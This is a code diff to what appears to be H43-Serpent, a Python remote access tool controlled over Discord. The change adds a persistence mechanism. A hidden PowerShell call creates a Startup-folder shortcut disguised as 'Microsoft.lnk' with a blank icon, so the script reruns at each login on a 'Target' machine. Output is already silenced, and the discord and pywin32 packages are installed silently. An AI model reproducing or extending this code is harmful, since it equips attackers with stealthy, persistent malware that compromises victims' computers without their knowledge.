@@ -15,6 +15,10 @@ Author: Fytex
 REPO: https://github.com/Fytex/H43-Serpent
 '''
 
+# This variable can be changed as long as it's Target's first time
+# otherwise it will have 2 shortcuts running program twice
+SHORTCUT_NAME = 'Microsoft.lnk'
+
 
 import sys, os
 
@@ -24,6 +28,19 @@ sys.stdout = open(os.devnull, 'w')
 sys.stderr = open(os.devnull, 'w')
 
 import subprocess
+
+# Powershell direct creation of Startup Shortcut if it doesn't access internet to install pywin32 before shutting down
+si = subprocess.STARTUPINFO()
+si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+ps_cmd = f'$dest=Join-Path ([Environment]::GetFolderPath("Startup")) {SHORTCUT_NAME}; $WshShell=New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut($dest) ;$Shortcut.TargetPath = "{sys.executable}";$shortcut.IconLocation = " "; $Shortcut.Arguments = "{os.path.realpath(__file__)}"; $Shortcut.Save()'
+subprocess.call(
+    ['powershell', '-Command', ps_cmd],
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+    startupinfo=si
+)
+
 packages = ['discord', 'pywin32']
 while subprocess.call(
     [sys.executable, '-m', 'pip', 'install', '--upgrade', *packages],
@@ -51,8 +68,6 @@ from win32com.client import Dispatch
 import win32.lib.win32con as win32con
 from win32com.shell import shell, shellcon
 
-
-SHORTCUT_NAME = 'Microsoft.lnk'
 def create_shortcut():
     d = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, None, 0)
     ws_shell = Dispatch('WScript.Shell')
